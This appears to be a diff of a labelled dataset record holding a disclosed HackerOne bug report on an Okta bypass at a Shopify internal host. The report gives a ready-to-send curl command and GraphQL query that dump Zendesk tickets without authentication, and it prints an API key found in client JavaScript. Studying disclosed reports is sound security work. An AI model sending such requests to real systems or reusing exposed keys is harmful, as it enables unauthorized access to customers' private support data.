@@ -1,60 +1,60 @@
 {
-    "reported_to": "Shopify",
-    "reported_by": "rijalrojan ",
-    "title": "Unauthenticated access to Zendesk tickets through athena-flex-production.shopifycloud.com Okta bypass",
-    "content": "\nSummary\nathena-flex-production.shopifycloud.com seems to be an internal system that Shopify uses because it redirects user to Okta login. During this however, I noticed that it first returns 200 and then does a redirect meaning some part of the website loads before redirecting. With this, I was able to get the JS being used in the system. Through the JS file, I found a path that allows GraphQL queries thus resulting in a full dump of Zendesk ticket information.\nDescription\nWhen you originally go to athena-flex-production.shopifycloud.com you will find that it will redirect to Okta. However if you do view-source:athena-flex-production.shopifycloud.com in Chrome, it will show that the website loads momentarily. In one of the script src, there is this link requested by the website:\nhttps://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js\nWhen you beautify the JS file you will notice it has some query data that can be used at the /graphql endpoint. After I got this, I started to play around with the GraphQL schema and see what I could gain access to.\nFor my test I sent:\nCode 422 Bytes\n1{\"query\": \"query getRecentTicketsQuery($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      zendesk {\\n        tickets(last: 5) {\\n          edges {\\n            node {\\n              id\\n               requester {\\n                name\\n              }\\n              subject\\n              description\\n              }\\n          }\\n        }\\n      }\\n    }\\n  }\\n\",\"variables\":{\"domain\":\"ok.myshopify.com\"}}\nWhat this query says is: Return last 5 tickets with description, reporter name and subject of the ticket that contain domain ok.myshopify.com. Once the query was done, it responded with 9,259 bytes of JSON response that contained extremely critical data.\nI don't want to paste the data here for obvious reason but I am attacking the file here so you can delete it by contact support@hackerone.com later if you wish to disclose the report.\nReproduction\nSend the following curl request:\nCode 994 Bytes\n1curl -i -s -k  -X $'POST' \\\n2    -H $'Host: athena-flex-production.shopifycloud.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Length: 422' \\\n3    --data-binary $'{\\\"query\\\": \\\"query getRecentTicketsQuery($domain: String) {\\\\n    shop(myshopifyDomain: $domain) {\\\\n      zendesk {\\\\n        tickets(last: 5) {\\\\n          edges {\\\\n            node {\\\\n              id\\\\n               requester {\\\\n                name\\\\n              }\\\\n              subject\\\\n              description\\\\n              }\\\\n          }\\\\n        }\\\\n      }\\\\n    }\\\\n  }\\\\n\\\",\\\"variables\\\":{\\\"domain\\\":\\\"ok.myshopify.com\\\"}}' \\\n4    $'https://athena-flex-production.shopifycloud.com/graphql'\nMore information\nThere is also an API key that I found on the JS file. I think this might be the Zendesk api key but I am not yet sure:\nCode 130 Bytes\n1R = n.n(O)()({\n2 apiKey: \"5c0246635b3c77189888c0b10d3427ac\",\n3 notifyReleaseStages: [\"production\"],\n4 releaseStage: \"production\" \n5}),\nImpact\nGet ticket description means dumping any detail you want.\nCreating zendesk ticket in behalf of other agents.\nChanging state of other tickets.\nI will post list of all functions that is possible in this graphql.\n\n",
-    "severity": [
-        9.8,
-        null
+  "reported_to": "Shopify",
+  "reported_by": "rijalrojan ",
+  "title": "Unauthenticated access to Zendesk tickets through athena-flex-production.shopifycloud.com Okta bypass",
+  "content": "\nSummary\nathena-flex-production.shopifycloud.com seems to be an internal system that Shopify uses because it redirects user to Okta login. During this however, I noticed that it first returns 200 and then does a redirect meaning some part of the website loads before redirecting. With this, I was able to get the JS being used in the system. Through the JS file, I found a path that allows GraphQL queries thus resulting in a full dump of Zendesk ticket information.\nDescription\nWhen you originally go to athena-flex-production.shopifycloud.com you will find that it will redirect to Okta. However if you do view-source:athena-flex-production.shopifycloud.com in Chrome, it will show that the website loads momentarily. In one of the script src, there is this link requested by the website:\nhttps://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js\nWhen you beautify the JS file you will notice it has some query data that can be used at the /graphql endpoint. After I got this, I started to play around with the GraphQL schema and see what I could gain access to.\nFor my test I sent:\nCode 422 Bytes\n1{\"query\": \"query getRecentTicketsQuery($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      zendesk {\\n        tickets(last: 5) {\\n          edges {\\n            node {\\n              id\\n               requester {\\n                name\\n              }\\n              subject\\n              description\\n              }\\n          }\\n        }\\n      }\\n    }\\n  }\\n\",\"variables\":{\"domain\":\"ok.myshopify.com\"}}\nWhat this query says is: Return last 5 tickets with description, reporter name and subject of the ticket that contain domain ok.myshopify.com. Once the query was done, it responded with 9,259 bytes of JSON response that contained extremely critical data.\nI don't want to paste the data here for obvious reason but I am attacking the file here so you can delete it by contact support@hackerone.com later if you wish to disclose the report.\nReproduction\nSend the following curl request:\nCode 994 Bytes\n1curl -i -s -k  -X $'POST' \\\n2    -H $'Host: athena-flex-production.shopifycloud.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Length: 422' \\\n3    --data-binary $'{\\\"query\\\": \\\"query getRecentTicketsQuery($domain: String) {\\\\n    shop(myshopifyDomain: $domain) {\\\\n      zendesk {\\\\n        tickets(last: 5) {\\\\n          edges {\\\\n            node {\\\\n              id\\\\n               requester {\\\\n                name\\\\n              }\\\\n              subject\\\\n              description\\\\n              }\\\\n          }\\\\n        }\\\\n      }\\\\n    }\\\\n  }\\\\n\\\",\\\"variables\\\":{\\\"domain\\\":\\\"ok.myshopify.com\\\"}}' \\\n4    $'https://athena-flex-production.shopifycloud.com/graphql'\nMore information\nThere is also an API key that I found on the JS file. I think this might be the Zendesk api key but I am not yet sure:\nCode 130 Bytes\n1R = n.n(O)()({\n2 apiKey: \"5c0246635b3c77189888c0b10d3427ac\",\n3 notifyReleaseStages: [\"production\"],\n4 releaseStage: \"production\" \n5}),\nImpact\nGet ticket description means dumping any detail you want.\nCreating zendesk ticket in behalf of other agents.\nChanging state of other tickets.\nI will post list of all functions that is possible in this graphql.\n\n",
+  "severity": [
+    9.8,
+    null
+  ],
+  "bounty": 5000,
+  "weaknesses": [
+    "Improper Authentication - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1537388100,
+  "report_url": "https://hackerone.com/reports/397130",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Observe that athena-flex-production.shopifycloud.com loads momentarily before redirecting to Okta"
     ],
-    "bounty": 5000,
-    "weaknesses": [
-        "Improper Authentication - Generic"
+    [
+      2,
+      "Using view-source in Chrome, examine the initial page content: view-source:athena-flex-production.shopifycloud.com"
     ],
-    "screenshots": {},
-    "disclosed_date": 1537388100,
-    "report_url": "https://hackerone.com/reports/397130",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "HIGH",
-    "vuln_category": "API",
-    "steps": [
-        [
-            1,
-            "Observe that athena-flex-production.shopifycloud.com loads momentarily before redirecting to Okta"
-        ],
-        [
-            2,
-            "Using view-source in Chrome, examine the initial page content: view-source:athena-flex-production.shopifycloud.com"
-        ],
-        [
-            3,
-            "Locate the JavaScript source file in the page source: https://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js"
-        ],
-        [
-            4,
-            "Beautify and analyze the JS to identify the GraphQL endpoint structure"
-        ],
-        [
-            5,
-            "Send a targeted GraphQL query directly to the endpoint to access Zendesk ticket information"
-        ]
+    [
+      3,
+      "Locate the JavaScript source file in the page source: https://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js"
     ],
-    "vuln_description": "This vulnerability allows unauthenticated access to sensitive Zendesk ticket information through a GraphQL endpoint exposed in a JavaScript file that loads before an Okta redirect on Shopify's internal system (athena-flex-production.shopifycloud.com).",
-    "reason": "The vulnerability involves multiple components (JS file analysis, GraphQL endpoint discovery, and Zendesk data access) and requires understanding the interaction between the initial page load and the Okta redirect. However, once the JS file is discovered, the attack is straightforward.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": false,
-    "authnz_byppass_detectable": true,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": false,
-        "authnz_byppass_detectable": true
-    }
+    [
+      4,
+      "Beautify and analyze the JS to identify the GraphQL endpoint structure"
+    ],
+    [
+      5,
+      "Send a targeted GraphQL query directly to the endpoint to access Zendesk ticket information"
+    ]
+  ],
+  "vuln_description": "This vulnerability allows unauthenticated access to sensitive Zendesk ticket information through a GraphQL endpoint exposed in a JavaScript file that loads before an Okta redirect on Shopify's internal system (athena-flex-production.shopifycloud.com).",
+  "reason": "The vulnerability involves multiple components (JS file analysis, GraphQL endpoint discovery, and Zendesk data access) and requires understanding the interaction between the initial page load and the Okta redirect. However, once the JS file is discovered, the attack is straightforward.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves unauthenticated access to a GraphQL endpoint that should be protected by Okta authentication. The methodology described involves testing actions with unauthenticated user sessions (step d), which would have detected the ability to access the GraphQL endpoint without proper authentication. Additionally, the GraphQL queries and responses are part of the normal flow of the application, and the unauthorized access would be caught by analyzing the requests and responses.",
+    "is_detectable": true
+  }
 }
